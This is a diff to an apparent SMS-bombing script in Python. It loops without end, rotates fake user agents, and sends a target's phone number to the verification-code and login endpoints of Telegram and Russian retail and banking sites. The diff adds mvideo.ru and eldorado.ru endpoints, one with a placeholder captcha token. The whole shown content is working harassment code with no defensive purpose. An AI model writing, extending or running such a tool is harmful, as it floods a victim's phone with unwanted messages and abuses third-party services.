@@ -1,7 +1,6 @@
+import formats
 from banners import *
 from formats import *
-import os
-import sys
 import requests
 import random
 import fake_useragent
@@ -36,14 +35,6 @@ while True:
         user = fake_useragent.UserAgent().random
         HEADERS = {'user_agent': user}
         print(f"{user} was selected as headers for this cycle")
-
-        # CAPTCHA
-        # try:
-        #     response = requests.post('https://dodopizza.ru/api/sendconfirmationcode',
-        #                              headers=HEADERS, data={'phoneNumber': NUMBER})
-        # except Exception as ex:
-        #     print(f"ERROR: {ex}")
-
         try:
             response = requests.post('https://my.telegram.org/auth/send_password',
                                      headers=HEADERS, data={'phone': NUMBER}, timeout=5.05)
@@ -130,6 +121,25 @@ while True:
                                            "product": False, "yandex_uid": None, "advid": "",
                                            "page_description": "Главная страница сайта", "agree_to_receive_ad": True})
             print("[+] tochka.com")
+        except Exception as ex:
+            print(f'ERROR: {ex}')
+        try:
+            response = requests.post('https://www.mvideo.ru/bff/auth/login-step-1',
+                                     headers=HEADERS,
+                                     json={"phoneNumber": NUMBER,
+                                           "token": "nocaptchatoken",
+                                           "sendBy": "CASCADE",
+                                           "action": "SENT_PIN_CODE"})
+            print("[+] mvideo.ru")
+        except Exception as ex:
+            print(f'ERROR: {ex}')
+        try:
+            response = requests.post('https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php',
+                                     headers=HEADERS,
+                                     json={"user_login": formats.format_spaces_without_braces(NUMBER),
+                                           "reregistration": "0",
+                                           "organization": "0"})
+            print("[+] eldorado.ru")
         except Exception as ex:
             print(f'ERROR: {ex}')
         print(f"{i} cycle finished")
